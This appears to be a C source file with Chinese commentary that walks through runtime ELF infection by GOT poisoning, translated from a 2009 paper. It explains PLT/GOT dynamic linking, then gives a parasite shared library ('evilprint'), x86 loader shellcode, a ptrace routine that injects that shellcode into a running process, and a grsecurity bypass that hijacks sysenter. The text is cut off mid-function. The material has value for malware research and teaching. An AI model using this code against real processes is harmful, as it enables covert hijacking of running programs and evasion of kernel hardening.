/* Modern Day ELF Runtime infection via GOT poisoning
 * Ryan O'Neill'
 * May 2009
 *
 * Related paper:
 * 1.Shared library redirection via ELF PLT infection by Silvio
 * 2.Cheating the ELF by Grugq
 * 3.The Cerberus ELF Interface by Mayhem
 * 4.ELF & Dynamic Linking
 *
 * 一. 打开一个ELF文件:
 */
 /* open, fstat the ELF file, then mmap it */
unsigned char *mem = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
Elf32_Ehdr *ehdr = (Elf32_Ehdr *)mem;
Elf32_Phdr *phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);
Elf32_Shdr *shdr = (Elf32_Shdr *)(mem + edhr->e_shoff);

/*本文用到的测试程序*/
int main(void)
{
  for(;;)
  {
    printf("test!\n");
    sleep(5);
  }
}

/* 可以利用readelf命令来查看ELF文件
 * # readelf -l <file> (获取program header 信息)
 * # readelf -S <file> (获取section header 信息)
 * # readelf -r <file> (获取重定位信息)
 *
 * 下面来看看测试程序的section header信息
 * localhost hijack$ readelf -S test
 *
 * There are 29 section headers, starting at offset 0x1204
 * Section Headers:
 *   [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
 *   [ 0]                   NULL            00000000 000000 000000 00      0   0  0
 *   [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
 *   [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
 *   [ 3] .hash             HASH            08048188 000188 00002c 04   A  5   0  4
 *   [ 4] .gnu.hash         GNU_HASH        080481b4 0001b4 000020 04   A  5   0  4
 *   [ 5] .dynsym           DYNSYM          080481d4 0001d4 000060 10   A  6   1  4
 *   [ 6] .dynstr           STRTAB          08048234 000234 000050 00   A  0   0  1
 *   [ 7] .gnu.version      VERSYM          08048284 000284 00000c 02   A  5   0  2
 *   [ 8] .gnu.version_r    VERNEED         08048290 000290 000020 00   A  6   1  4
 *   [ 9] .rel.dyn          REL             080482b0 0002b0 000008 08   A  5   0  4
 *   [10] .rel.plt          REL             080482b8 0002b8 000020 08   A  5  12  4
 *   [11] .init             PROGBITS        080482d8 0002d8 000017 00  AX  0   0  4
 *   [12] .plt              PROGBITS        080482f0 0002f0 000050 04  AX  0   0  4
 *   [13] .text             PROGBITS        08048340 000340 000194 00  AX  0   0 16
 *   [14] .fini             PROGBITS        080484d4 0004d4 00001c 00  AX  0   0  4
 *   [15] .rodata           PROGBITS        080484f0 0004f0 00000e 00   A  0   0  4
 *   [16] .eh_frame         PROGBITS        08048500 000500 000004 00   A  0   0  4
 *   [17] .ctors            PROGBITS        08049f0c 000f0c 000008 00  WA  0   0  4
 *   [18] .dtors            PROGBITS        08049f14 000f14 000008 00  WA  0   0  4
 *   [19] .jcr              PROGBITS        08049f1c 000f1c 000004 00  WA  0   0  4
 *   [20] .dynamic          DYNAMIC         08049f20 000f20 0000d0 08  WA  6   0  4
 *   [21] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
 *   [22] .got.plt          PROGBITS        08049ff4 000ff4 00001c 04  WA  0   0  4
 *   [23] .data             PROGBITS        0804a010 001010 00000c 00  WA  0   0  4
 *   [24] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  4
 *   [25] .comment          PROGBITS        00000000 00101c 00010a 00      0   0  1
 *   [26] .shstrtab         STRTAB          00000000 001126 0000db 00      0   0  1
 *   [27] .symtab           SYMTAB          00000000 00168c 000330 10     28  31  4
 *   [28] .strtab           STRTAB          00000000 0019bc 00014e 00      0   0  1
 *   Key to Flags:
 *   W (write), A (alloc), X (execute), M (merge), S (strings)
 *   I (info), L (link order), G (group), x (unknown)
 *   O (extra OS processing required) o (OS specific), p (processor specific)
 *
 * 上面展示了所有的section，其中我们感兴趣的是 .text, .dynsym, .rel.plt, .rel.dyn
 *
 *
 * 动态链接
 * 在可执行文件编译的时候，生成对动态库中符号的引用，但在可执行文件执行的时候，这些符号引用才会被定义，符号的地址被mmap(内存映射)到进程的地址空间，例如一个可执行文件调用了多次libc中的函数，eg:对strcpy的调用形如"call 8048330 strcpy@plt"，地址8048330位于.plt(过程连接表)中，PLT将在运行的时候解析出函数strcpy的真实地址。
 * 下面展示了PLT:
 * 080482f0 <__gmon_start__@plt-0x10>:
 *  80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
 *  80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
 *  80482fc:       00 00                   add    %al,(%eax)
 *    ...
 *
 * 08048300 <__gmon_start__@plt>:
 *  8048300:       ff 25 00 a0 04 08       jmp    *0x804a000
 *  8048306:       68 00 00 00 00          push   $0x0
 *  804830b:       e9 e0 ff ff ff          jmp    80482f0 <_init+0x18>
 *
 * 08048310 <__libc_start_main@plt>:
 *  8048310:       ff 25 04 a0 04 08       jmp    *0x804a004
 *  8048316:       68 08 00 00 00          push   $0x8
 *  804831b:       e9 d0 ff ff ff          jmp    80482f0 <_init+0x18>
 *
 * 08048320 <sleep@plt>:
 *  8048320:       ff 25 08 a0 04 08       jmp    *0x804a008
 *  8048326:       68 10 00 00 00          push   $0x10
 *  804832b:       e9 c0 ff ff ff          jmp    80482f0 <_init+0x18>
*
*  08048330 <puts@plt>:
*   8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
*   8048336:       68 18 00 00 00          push   $0x18
*   804833b:       e9 b0 ff ff ff          jmp    80482f0 <_init+0x18>)
*
*   我们用puts()作为一个例子：
*  08048330 <puts@plt>:
*   8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
*   8048336:       68 18 00 00 00          push   $0x18
*   804833b:       e9 b0 ff ff ff          jmp    80482f0 <_init+0x18>)
*   PLT首先间接跳转到*0x804a00c, 0x804a00c是GOT中的条目，现在还没有保存puts函数的真实地址，而保存的是PLT中的下一条指令(push $0x18)的地址, 0x18是puts函数在重定位表中的偏移，类型为R_386_JUMP_SLOT
*
* localhost hijack$ readelf -r test
* Relocation section '.rel.dyn' at offset 0x2b0 contains 1 entries:
*  Offset     Info    Type            Sym.Value  Sym. Name
*  08049ff0  00000106 R_386_GLOB_DAT    00000000   __gmon_start__
*
* Relocation section '.rel.plt' at offset 0x2b8 contains 4 entries:
*  Offset     Info    Type            Sym.Value  Sym. Name
*  0804a000  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
*  0804a004  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main
*  0804a008  00000307 R_386_JUMP_SLOT   00000000   sleep
*  0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts
*
*  puts条目中的Offset(0x0804a00c)将保存解析后的puts真实地址
*  我们来看下一条指令:
*  804833b:       e9 b0 ff ff ff          jmp    80482f0 <_init+0x18>
*  这将跳转到PLT的第一个条目(80492f0)，即PLT0:
*  080482f0 <__gmon_start__@plt-0x10>:
    80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
    80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
*  首先需要知道的是GOT保留了它的第二个和第三个条目，第一条pushl将GOT的第二个条目压入栈中，这个值是link_map(struct link_map)的地址，下一条指令跳转到*0x8049ffc，8049ffc是GOT表的第三个条目，这样就将控制转给了动态连接器。动态连接器从栈中获取重定位条目的偏移(在我们的例子就是0x18)，然后解析出符号的地址并保存到重定位偏移(r_offset)指定的GOT条目中,也就是804a00c，以后对puts@plt的调用将直接跳转到puts函数的真实地址。
*
*  默认情况下linux使用“惰性链接”,这意味着符号在第一次被使用时才会进行解析，这种行为可通过改变LD_BIND_NOW环境变量来改变。
*  根据上面讲解的动态链接的过程，有两种方法进行动态链接库hijacking：
*  1. 用push $0x0, ret 覆盖动态链接库函数的开头6个字节，然后使用一个替代的库函数地址对它打补丁，然后在通过一个保存的函数指针调用它之前从原来的函数中暂时移除push/ret
*  2. 通过mmap我们的替代函数来覆盖原函数在GOT中的条目，在替代函数的最后跳转到原函数。
*  本文将讲解第二种方法，唯一有点儿困难的是如何在运行时将我们自己的动态库加载到进程中。首先我们需要合适的衍生方案(parasite design)
*
*  我们需要衍生的是一个动态库，或者说是一个替代函数，这意味着在调用原函数之前我们能执行额外的检查并且修改它的参数，在设计hijacking动态库的算法时，有一些原则：
*  1. 我们的动态库对象应该是位置无关的代码(Position independent code)，因为我们将使用mmap()将它映射到进程地址空间却不进行任何重定位操作。类似于dlopen()的函数将执行解析和重定位，但是我们的加载代码不使用dlopen而是使用一个简单的方法：mmap(),必须确保动态库是完全位置无关或者使用Diet Libc静态编译。最初的想法是使用类似于dlopen函数，在现代的glibc版本中，只有__libc_dlopen_mode()有一些问题，而我肯定能够解决，但我决定不使用它们因为我觉得没有必要。
*  注意 Diet Libc
*  避免在衍生的程序中使用libc可能无法接受，但使用libc意味着我们需要自己解析重定位，这需要更精巧的object loading shellcode。幸运的是我们可以使用Diet libc来绕过这个问题，Diet libc是一个压缩过的轻量级版本的libc，它可以被静态编译到我们的动态库中从而避免重定位问题
*  PIC Example:
*  如果衍生代码是PIC代码，那么我们不能使用libc中的函数，只能直接调用系统调用，而且必须符合PIC.
* */
static int _write(int fd, void *buf, int count)
{
  long ret;
  /* a: eax, S: esi, c: ecx, d: edx , "0"(SYS_write)将SYS_write放到eax中*/
  __asm__ __volatile__("pushl %%ebx\n\t"
                       "movl %%esi,%%ebx\n\t"
                       "int $0x80\n\t"
                       "popl %%ebx"
                       :"=a"(ret)
                       :"0"(SYS_write), "S"((long)fd),
                       "c" ((long)buf), "d"((long)count));
  if (ret >= 0)
    return (int)ret;
  return -1;
}
/* 而且，我们的衍生代码的makefile应该像这样：
 * gcc -fPIC -c libtest.c -nostdlib
 * ld -shared -soname libtest.so.1 -o libtest.so.1.0 libtest.o
 *
 * 2. 替代函数的结尾应该跳转回原来的函数，而且stack pointer应该在正确的位置。我的衍生程序框架以一个function epilogue结尾，这是一个间接跳转jmp到原来的函数中，这是衍生程序结束的唯一方式：
 */
__asm__ __volatile__
   ("movl %ebp, %esp\n" "pop %ebp\n" "movl $0x00000000, %eax\n" "jmp *%eax");
/* 保持volatile这样当我们patch它的时候它不会被编译器优化
 *
 * 测试衍生代码：
 * 我们的目标程序，上面的test每隔5秒输出"test!"，我们将hijacking libc的puts()函数，我们的替代函数也应该有和原函数一样的参数
 */
   /***************** Shared Object Parasite ************************/
#include <sys/types.h>
#include <sys/syscall.h>
int evilprint(char *);
static int _write(int fd, void *buf, int count)
{
  long ret;
  __asm__ __volatile__ ("pushl %%ebx\n\t"
                        "movl %%esi,%%ebx\n\t"
                        "int $0x80\n\t" "popl %%ebx":"=a"(ret)
                        :"0" (SYS_write), "S"((long)fd),
                        "c" ((long)buf), "d"((long)count));
  if (ret >= 0)
    return (int)ret;
  return -1;
}

int evilprint(char *buf)
{
  /* we must allocate our strings this way on the stack to be PIC*/
  /* otherwise they get stored into .rodata and we can't use them*/
  char new_string[5];
  new_string[0] = 'e';
  new_string[1] = 'v';
  new_string[2] = 'i';
  new_string[3] = 'l';
  new_string[4] = 0;

  /* we are prepending the word 'evil' to whatever string is on the stack*/
  _write(1, new_string, 5);
  _write(1, buf, 5);
  char newline[1];
  newline[0] = '\n';
  _write(1, newline, 1);

  /* perform the function epilogue, and setup the jump which our */
  /* hijacker will patch with the right address */
  __asm__ __volatile__
    ("movl %ebp, %esp\n" "pop %ebp\n" "movl $0x00000000, %eax\n" "jmp *%eax");
}

void _init()
{
}
void _fini()
{
}

/* 这个衍生程序仍然还有改进的空间，通过修改栈可以修改参数，最简单的方法是使用function pointer而不是jmp，如果我们的衍生程序修改puts的参数(存放在栈上)，我们的衍生程序就像下面这样：
 * */
/* parasite that modifies args */
int evilprint(char *buf)
{
  char new_string[5];
  new_string[0] = 'e';
  new_string[1] = 'v';
  new_string[2] = 'i';
  new_string[3] = 'l';
  new_string[4] = 0;

  int (*origfunc)(char *p) = 0x00000000;
  return origfunc(new_string);
}
/* 注意我们的hijacker需要原puts函数的地址来patch函数指针
 *
 * 4. 载入衍生代码
 * 很明显如果没有载入库文件那么程序将无法调用库函数，也许在编写这个衍生代码时最需要技巧的就是设计最好的方法将我们的evil shared object载入到进程的地址空间，在文章的结尾，我提供了两种可靠的方法来迫使目标进程加载我们的动态库，其中的一种方法可以bypass grsec memory protection for ELF segment binary flags.
 * 我最初的方法只是一个纯粹的proof of concept，因此可以简单的利用我的hijacking 算法而不用让我的hijacker真正的做加载 -- 使用LD_PRELOAD(无法动态加载，需要重启目标进程)
 * 正如之前提到的一样，__libc_dlopen_mode存在于libc中而且可以加载动态库对象，但是使用它我还没有成功，也许它需要先进行一些初始化。
 * 我的通用办法是简单的mmap映射动态库为"rwx"(可读，可写，可执行)，这个方法不用处理重定位，但如果不涉及动态链接，那么它是一个较好的方法
 * 4.1 加载库的通用方法
 * _start:
 *       jmp B
 * A:
 *   # fd = open("libtest.so.1.0", O_RDONLY);
 *   xorl %ecx, %ecx
 *   movb $5, %al
 *   popl %ebx
 *   xorl %ecx, %ecx
 *   int $0x80
 *
 *   subl $24, %esp
 *
 *   # mmap(0,8192,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);
 *   xorl %edx, %edx
 *   movl %edx, (%esp)
 *   movl $8102, 4(%esp)
 *   movl $7, 8(%esp)
 *   movl $2, 12(%esp)
 *   movl %eax, 16(%esp)
 *   movl %edx, 20(%esp)
 *   movl $90, %eax
 *   movl %esp, %ebx
 *   int $0x80
 *
 *   # We need this to transfer control back to our hijacker once our hsellcode is done executing
 *   int 3
 *   # To get the address of the string dynamically we use call/pop method
 *   # Call指令会将下一条指令的地址push到栈上，然后跳到目标地址处开始执行
 * B:
 *   call A
 *   .string "libtest.so.1.0"
 *
 *  这段简单的代码将evil共享对象(大小约为5k)mmap到进程的地址空间,mmap的权限为rwx，通常情况下libc会有多次mmap到进程中，一次为了代码段(text segment(with execute))，一次是为了数据段(data segment(with read))。在我们的例子中，我们只用rwx为参数mmap加载了一次(除非碰到了GRSEC) --但我们怎样使进程执行这段代码了？答案是我们必须使用ptrace来注入代码到正在运行的进程中，然后修改EIP来执行它。
 *
 *  4.2 绕过Grsec的加载方法
 *  linux的grsec内核补丁有许多的特点，本文涉及到了其中的一些，最主要的特点就是代码段(text segment)被标记为read/execute，这样就不能使用ptrace注入shellcode(代码段不可写),我们将用下面的方法克服这个困难。
 *  使用 PTRACE_SYSCALL 来定位 sysenter
 *  systenter用在现在的linux内核中，用来替代int $0x80.由于grsec的保护，所有的内存maps的地址都是空的，这种情况下，从map文件中获取地址就没有任何用处,下面就是我们要找的：
 *  fffe420 <__kernel_vsyscall>:
 *  ffffe420:       51                      push   %ecx
 *  ffffe421:       52                      push   %edx
 *  ffffe422:       55                      push   %ebp
 *  ffffe423:       89 e5                   mov    %esp,%ebp
 *  ffffe425:       0f 34                   sysenter
 *  我们的目标是定位正在执行的进程的下一个系统调用，然后获取EIP,EIP的值很可能是systenter之后的几个字节，所以也许是ffffe430.
 *
 *  在syscall执行sysenter之前保存寄存器的值(Save the registers right before the syscall is called with sysenter)
 *  修改%eax的值为我们希望执行的系统调用编号，在我们的例子中是SYS_open.
 *  修改参数args使它符合我们的syscall，并将需要的args保存到data segment中(不是在栈中)。在我们的例子中，保存data segment开头的N个字节，然后写入我们自己的字符串"/lib/libtest.so.1.0"
 *  通过使用ptrace将(reg.eip-20)读到buffer中来定位sysenter,然后在buffer中搜索指令"\x0f\x34"，因此sysenter = (reg.eip - 20) + index
 *  修改%eip来指向sysenter，然后使用PTRACE_SINGLESTEP来执行指令直到sysenter. 重复3-6的过程，但使用mmap()，然后进入步骤7
 *  恢复数据段(data segment)
 *  上面过程的代码将在后面给出
 *
 *  同样值得注意的是我们可以通过使用MAP_FIXED参数的mmap来修改代码段(.text)的内存结构，从而将代码注入到代码段中，但是这种修改将会明显的反映在/proc/pid/maps中。
 *
 *  Hijacker 算法
 *  1. 通过解析/proc/<pid>/maps定位目标进程
 *  2. 解析PLT来获取需要的GOT地址
 *  3. 附加到目标进程上
 *  4. 寻找一个地方来加载我们的.so loader shellcode
 *  下面的步骤5-8对于有GRSEC补丁的内核不同
 *
 *  没有GRSEC的内核：
*   5. 注入新的代码，并且保存被注入代码覆盖的原始代码
*   6. 获取进程的寄存器，保存EIP，然后将EIP修改为指向我们代码
*   7. 继续执行目标进程，它将执行我们注入的.so loader shellcode，然后将我们的lib加载到进程中
*   8. 重置寄存器，恢复原来的代码，是进程能继续执行。
*
*   包含GRSEC的内核:
*   6. 定位sysenter
*   7. 保存寄存器状态
*   8. 修改寄存器和args来调用open/mmap
*   9. 从%eax中获取我们动态库的基地址(Get base address of our evil library form %eax)
*   10. 通过扫描指令的方式从动态库中获取我们的evil function的地址
*   11. 获取并保存GOT中保存的原函数的地址
*   12. 用我们的evil function的地址覆盖GOT中原函数的地址
*   13. Detach目标进程
*
*   下面我们来详细解释上述步骤:
*   STEP1: 第一步我们需要定位产生目标进程的二进制文件,进程地址空间表类似于这样：
*-- /proc/<pid>/map --

08048000-08049000 r-xp 00000000 08:01 5654053    /home/elf/got_hijack/test

08049000-0804a000 rw-p 00000000 08:01 5654053    /home/elf/got_hijack/test

b7e19000-b7e1a000 rw-p b7e19000 00:00 0

b7e1a000-b7f55000 r-xp 00000000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so

b7f55000-b7f56000 r--p 0013b000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so

b7f56000-b7f58000 rw-p 0013c000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so

b7f58000-b7f5b000 rw-p b7f58000 00:00 0

b7f65000-b7f68000 rw-p b7f65000 00:00 0

b7f68000-b7f81000 r-xp 00000000 08:01 9093141    /lib/ld-2.5.so

b7f81000-b7f83000 rw-p 00019000 08:01 9093141    /lib/ld-2.5.so

bff6d000-bff82000 rw-p bffeb000 00:00 0          [stack]

ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]]]
*
* 这个文件展现了进程的内存镜像,包括生成进程的可执行文件和映射到进程中的动态库。基地址展现在第一行(8048000),我们可以从这个文件中获得，也可以从text的phdr->p_vaddr获取。对于ET_DYN文件有一些不同，我们获取它的基地址，然后根据它在内存中的加载地址获取偏移，从而得到真实的地址。需要注意的是包含GRSEC补丁的系统将不会在这个map文件中展现地址，那么我们只能用其它方式获取地址，例如phdr->p_vaddr.
*
*  STEP 2
*  我们将决定需要hijack的函数，获取它的重定位项从而获取获得相应的GOT address/offset,通过解析可执行文件就可以获取这些信息(当然通过解析进程内存映像也是可以的)，下面的代码将获取"readelf -r"从ELF文件中得到的信息
 */
 /* my custom struct linking_info looks like: */
 struct linking_info
{
  char name[256]; /* symbol name   */
  int index;      /* symbol number */
  int count;      /* total # of symbols */
  uint32_t offset; /* adddr/offset into the GOT */
}

/* unsigned char *mem is a pointer to an mmap of the ELF file */
struct linking_info *get_plt(unsigned char *mem)
{
  Elf32_Ehdr *ehdr;
  Elf32_Shdr *shdr, *shdrp, *symshdr;
  Elf32_Sym *syms, *symsp;
  Elf32_Rel *rel;

  char *symbol;
  int i, j, symcount, k;
  struct linking_info *link;
  ehdr = (Elf32_Ehdr *)mem;
  shdr = (Elf32_Shdr *)(mem + ehdr->e_shoff);
  shdrp = shdr;
  for (i = ehdr->e_shnum; i-- > 0; shdrp++)
  {
    if (shdrp->sh_type == SHT_DYNSYM)
    {
      symshdr = &shdr[shdrp->sh_link];
      if ((symbol = malloc(symshdr->sh_size)) == NULL)
        goto fatal;
      memcpy(symbol, (mem + symshdr->sh_offset), symshdr->sh_size);
      if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
        goto fatal;
      memcpy((Elf32_Sym *)syms, (Elf32_Sym *)(mem + shdrp->sh_offset), shdrp->sh_size);
      symsp = syms;
      symcount = (shdrp->sh_size / sizeof(Elf32_Sym));
      link = (struct linking_info *)malloc(sizeof(struct linking_info)* symcount);
      if (!link)
        goto fatal;
      link[0].count = symcount;
      for (j=0; j<symcount; j++, symsp++)
      {
        strncpy(link[j].name, &symbol[symsp->st_name], sizeof(link[j].name) - 1);
        if (!link[j].name)
          goto fatal;
        link[j].index = j;
      }
      break;
    }
  }
  for (i = ehdr->e_shnum; i-- > 0; shdr++)
  {
    switch(shdr->sh_type)
    {
      case SHT_REL:
        rel = (Elf32_Rel *) (mem + shdr->sh_offset);
        for (j=0; j<shdr->sh_size; j+=sizeof(Elf32_Rel),rel++)
        {
          for (k=0; k<symcount; k++)
          {
            if (ELF32_R_SYM(rel->r_info) == link[k].index)
              link[k].offset = ret->r_offset;
          }
        }
        break;
      case SHT_RELA:
        break;
      default:
        break;
    }
  }
  return link;
fatal:
  return NULL;
}

/* To call the function we could do: */
if ((lp = (struct linking_info*)get_plt(mem)) == NULL)
{
  printf("get_plt() failed\n");
  goto done;
}
/* 'struct lp'将为我们提供相关的PLT信息来读取我们要hijack的目标符号的GOT entry
 *
 * STEP 3
 * 现在我们来用PTRACE_ATTACH附加到进程:
 */
 if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
{
  printf("Failed to attach to process\n");
  exit(-1);
}
waitpid(pid, &status, WUNTRACED);

/* STEP 4-8 (无GRSEC的方法)
 * 我们需要目标进程加载我们的evil .so(动态库),因此我们需要将loader shellcode注入到进程中，有人可能会想到保存到stack上，但是很多系统栈不可执行(non-executable stack)，使用代码段(text segment)是明智的选择，这样我们可以直接从基地址8048000开始覆盖前90字节写入我们的shellcode，当然在覆盖之前我们必须保存被覆盖的内容。
*/
/* 下面是我们的shellcode */
char mmap_shellcode[] =
"\xe9\x3b\x00\x00\x00\x31\xc9\xb0\x05\x5b\x31\xc9\xcd\x80\x83\xec"
"\x18\x31\xd2\x89\x14\x24\xc7\x44\x24\x04\x00\x20\x00\x00\xc7\x44"
"\x24\x08\x07\x00\x00\x00\xc7\x44\x24\x0c\x02\x00\x00\x00\x89\x44"
"\x24\x10\x89\x54\x24\x14\xb8\x5a\x00\x00\x00\x89\xe3\xcd\x80\xcc"
"\xe8\xc0\xff\xff\xff\x6c\x69\x62\x74\x65\x73\x74\x2e\x73\x6f\x2e"
"\x31\x2e\x30\x00";

/* 我们的hijacker将使用如下的函数来迫使目标进程加载我们的动态库
 * */
int mmap_library(int pid)
{
  struct user_regs_struct reg;
  long eip, esp, string, offset, str, eax, ebx, ecx, edx;
  int i, j=0, ret, status;
  unsigned long buf[30];
  unsigned char saved_text[94];
  unsigned char *p;
  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
  /* 保存寄存器状态 */
  eip = reg.eip;
  esp = reg.esp;
  eax = reg.eax;
  ebx = reg.ebx;
  ecx = reg.ecx;
  edx = reg.edx;

  offset = text_base;
  printf("%%eip -> 0x%x\n", eip);
  printf("Injecting mmap_shellcode at 0x%x\n", offset);
  /* 在当前EIP处写入我们的shellcode */
  /* 首先我们必须备份原来的代码 */
  for (i=0; i< 90; i += 4)
    buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));
  p = (unsigned char *)buf;
  memcpy(saved_text, p, 90);

  /* 在text的开头处写入shellcode*/
  for (i=0; i<90; i += 4)
    ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(mmap_shellcode + i));
  printf("\nSetting %%eip to 0x%x\n", offset);
  reg.eip = offset + 2;
  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
  ptrace(PTRACE_CONT, pid, NULL, NULL);
  wait(NULL);
  /* check where eip is now at */
  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
  printf("%%eip is now at 0x%x, resetting is to 0x%x\n", reg.eip, eip);
  printf("inserting original code back\n");
  for(j = 0,i = 0; i < 90; i += 4)
    buf[j++] =  ptrace(PTRACE_POKETEXT, pid, (offset+i), *(long*) (saved_text + i));
  /* 重置寄存器状态 */
  reg.eip = eip;
  reg.eax = eax;
  reg.ebx = ebx;
  reg.ecx = ecx;
  reg.edx = edx;
  reg.esp = esp;

  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
  /* detach -- when we re-attach we will have access to our*/
  /* shared library */
  if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
  {
    perror("ptrace_detach");
    exit(-1);
  }
}

/* STEP 4-8 (内核有GRSEC补丁) */
/* 注意：这个方法假定GRSEC补丁并不禁止使用ptrace
 * 正如之前所说的，grsec补丁将会禁止向一个不可写的映射区间写数据，这样的话通过注入shellcode的方式加载动态库的方法将不可行，这种情况下，我们将不注入任何代码，而是hijack已有的系统调用入口然后利用它来首先执行我们伪造的系统调用，然后再执行真实的系统调用。我们想动态的定位sysenter的地址(不通过/proc/<pid>/map文件)，我们可以使用PTRACE_SYSCALL来达到目的。在很多的内核中，linux-gate并不会随机化(在当前的ubuntu系统上，随机化了linux-gate，见linux-vdso.so.1的映射地址)，但是获取linux-gate中的sysenter的地址必须动态进行，因为被grsec保护的内核对每个进程动态加载linux-gate到内存中。一旦我们获取了sysenter的地址，我们从sysenter的第五个字节开始，如果直接从sysenter开始，那么在有些系统上这个方法似乎不会成功。我们将eax设为SYS_open的系统调用编号，将库文件字符串保存在数据段中(data segment)。我们接下来单步执行5个步骤，这样我们将get through sysenter,最后%eax将保存返回值，这个返回值就是供mmap调用的fd，接下来我们使用同样的方法调用mmap，但是我们将所有的参数保存在数据段中动态库字符串的后面，将它们的地址保存在%bx中。一个显著的不同是我们将分开映射代码段(text segment)和数据段(data segment)。直接将一整个文件映射到内存是无法工作的，因为代码段不能有可写权限，数据段不能有可执行权限，这是PaX的mprotect()的限制
 * linux-gate(被随机化了):
 * sniper@sniper-Aspire-4752:~/exploit/Virus$ ldd test
 * linux-vdso.so.1 =>  (0x00007ffff75ff000)
 * libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4ffe709000)
 * /lib64/ld-linux-x86-64.so.2 (0x00007f4ffeae3000)
 * sniper@sniper-Aspire-4752:~/exploit/Virus$ ldd test
 * linux-vdso.so.1 =>  (0x00007fff38de5000)
 * libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe49094e000)
 * /lib64/ld-linux-x86-64.so.2 (0x00007fe490d28000)
 *
 * 下面来看代码：
 */
int grsec_mmap_library(int pid)
{
  struct user_regs_struct reg;
  long eip, esp, string, offset, str, ebx, eax, ecx, orig_eax, data;
  int syscall;
  int i,j = 0, ret, status, fd;
  char library_string[MAXBUF];
  char orig_ds[MAXBUF];
  char buf[MAXBUF]={0};
  unsigned char tmp[8192];
  char open_done = 0, mmap_done = 0;
  unsigned long int80 = 0;
  unsigned long sysenter = 0;

  strcpy(library_string, EVILLIB_FULLPATH);

  /* 保存data segment的第一部分数据，这部分数据将被我们用来填充*/
  /* 字符串和一些变量 */
  memrw ((unsigned long *)orig_ds, data_segment, strlen(library_string)+32, pid, 0);

  /* store our string for our evil lib there */
  for (i = 0; i < strlen(library_string); i += 4)
    ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long*)(library_string + i));
  /* verify we have the correct string */
  for (i = 0; i < strlen(library_string); i += 4)
    *(long *)&buf[i] = ptrace(PTRACE_PEEKTEXT, pid, (data_segment + i));
  if (strcmp(buf, EVILLIB_FULLPATH) == 0)
    printf("Verified string is stored in DS: %s\n", buf);
  else
  {
    printf("String was not properly stored in DS: %s\n", buf);
    return 0;
  }

  ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
  wait(NULL);

  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
  eax = reg.eax;
  ebx = reg.ebx;
  ecx = reg.ecx;
  edx = reg.edx;
  eip = reg.eip;
  esp = reg.esp;

  long syscall_eip = reg.eip - 20;
  /* this gets sysenter dynamically incase its randomized */
  if (!static_sysenter)
  {
    memrw((unsigned long *)tmp, syscall_eip, 20, pid, 0);
    for (i = 0; i < 20; i++)
    {
      if (!(i % 10))
        printf("\n");
      printf("%.2x", tmp[i]);
      if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
        sysenter = syscall_eip + i;
    }
  }
  /* this works only if sysenter isn't at random location*/
  else
  {
    memrw((unsigned long *)tmp, 0xffffe000, 8192, pid, 0);
    for (i = 0; i < 8192; i++)
    {
       if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
          sysenter = 0xffffe000 + i;
    }
  }
  sysenter -= 5;
  if (!sysenter)
  {
     printf("Unable to find sysenter\n");
     exit(-1);
  }
  printf("Sysenter found: %x\n", sysenter);
  /*
   *
   *          sysenter should point to:
   *              push   %ecx
   *              push   %edx
   *              push   %ebp
   *              mov    %esp,%ebp
   *              sysenter
   */
  ptrace(PTRACE_DETACH, pid, NULL, NULL);
  wait(0);
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
  {
    perror("ptrace_attach");
    exit(-1);
  }
  waitpid(pid, &status, WUNTRACED);

  reg.eax = SYS_open;
  reg.ebx = (long)data_segment;
  reg.ecx = 0;
  reg.eip = sysenter;

  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
  ptrace(PTRACE_GETREGS, pid, NULL, &reg);

  for (i = 0; i < 5; i++)
  {
    ptrace(PTRACE_SINGLESTEP, pid, NULL);
    wait(NULL);
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
    if (reg.eax != SYS_open)
      fd = reg.eax;
  }
  offset = (data_segment + strlen(library_string)) + 8;

  reg.eip = sysenter;
  reg.eax = SYS_mmap;
  reg.ebx = offset;

  /* MAP IN TEXT RE */
  ptrace(PTRACE_POKETEXT, pid, offset, 0);
  ptrace(PTRACE_POKETEXT, pid, offset+4, segment.text_len + (PAGE_SIZE - (segment.text_len & (PAGE_SIZE - 1))));
  ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);
  ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);
  ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
